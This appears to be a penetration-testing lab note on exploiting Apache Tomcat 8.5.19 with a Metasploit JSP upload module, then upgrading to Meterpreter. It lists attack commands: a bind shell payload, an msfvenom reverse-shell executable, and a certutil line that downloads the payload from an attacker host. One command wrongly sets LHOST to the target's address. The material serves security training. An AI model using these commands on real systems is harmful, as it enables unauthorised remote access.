# Exploiting A Vulnerable Apache Tomcat Web Server

* Apache Tomcat is a free and open source Java servlet web server.
* It is used to build and host dynamic websites and web applications based on the Java software platform.
* Apache Tomcat utilizes the HTTP protocol to facilitate the underlying communication between the server and clients.
* Apache Tomcat runs on TCP port 8080 by default.
* The standard Apache HTTP web server is used to host static and dynamic websites or web applications, typically developed in PHP.
* The Apache Tomcat web server is primarily used to host dynamic websited or web applications developed in Java.
* Apache Tomcat V8.5.19 is vulnerable to a remote code exectution vulnerability that could potentially allow an attacker to upload and execute a JSP payload in order to gain remote access to the target server.
* We can utilize a prebuilt MSF exploit module to exploit this vulnerability and consequently gain access to the target server.

## Practice Demo

Enumerate the target using the db\_nmap command

* <mark style="color:yellow;">db\_nmap -sS -sV -O targetIP</mark>

<figure><img src="../../.gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>

#### Exploiting the exploit module

* <mark style="color:yellow;">exploit/multi/http/tomcat\_jsp\_upload\_bypass</mark>

Set the required options

Set the payload accordingly

* <mark style="color:yellow;">set payload java/jsp\_shell\_bind\_tcp</mark>

Set the system shell to use:

* <mark style="color:yellow;">set SHELL cmd</mark>

<mark style="color:purple;">NOTE:</mark> This module might need to be ran several times before working

### Obtaining a meterpreter session through the existing shell session

#### Creating payload using msfvenom

* <mark style="color:yellow;">msfvenom  -p windows/meterpreter/reverse\_tcp LHOST=targetIP LPORT=Port -f exe > meterpreter.exe</mark>

Now we will upload this payload to the target machine and then run the payload to obtain a meterpreter session on the target.

For this we server a python server on our machine.

* <mark style="color:yellow;">python -m SimpleHTTPServer 80</mark>

Move to the existing session using:

* <mark style="color:yellow;">sessions 1</mark>

Download the payload from our attacker machine using:

* <mark style="color:yellow;">certutil -urlcache -f http://attackerIP/meterpreter.exe meterpreter.exe</mark>

Set the multi/handler to receive the connection back

Execute the payload on the target machine:

* <mark style="color:yellow;">.\meterpreter.exe</mark>
